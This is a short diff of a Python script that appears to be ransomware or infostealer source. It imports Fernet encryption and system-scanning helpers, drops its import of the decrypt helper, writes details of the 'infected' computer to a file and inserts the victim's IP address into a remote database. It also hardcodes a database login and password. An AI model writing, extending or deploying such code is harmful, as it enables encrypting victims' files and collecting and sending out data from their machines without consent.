@@ -4,17 +4,14 @@ import subprocess
 import win32com.shell.shell as shell
 from cryptography.fernet import Fernet
 from PIL import Image
-import win32api
 import requests
 import sys
 import shutil
-import mysql.connector
-import datetime
 
 
 from conec import Database
 from escan import obtener_informacion_sistema
-from utils import generar_key, cargar_key, encrypt, decrypt 
+from utils import generar_key, cargar_key, encrypt
 
 USERNAME = "root"
 PASSWORD = "Ponce1337"
@@ -190,7 +187,6 @@ def main():
                         archivo_infectado.write(clave + ': ' + str(valor) + '\n')
                 print("Archivo 'info_equipo_infectado.txt' creado con éxito en la carpeta 'files'.")
                 ip_address = informacion_sistema['Dirección IP']
-
                 ip_address = informacion_sistema['Dirección IP']
                 db.insert_data(ip_address)
                  
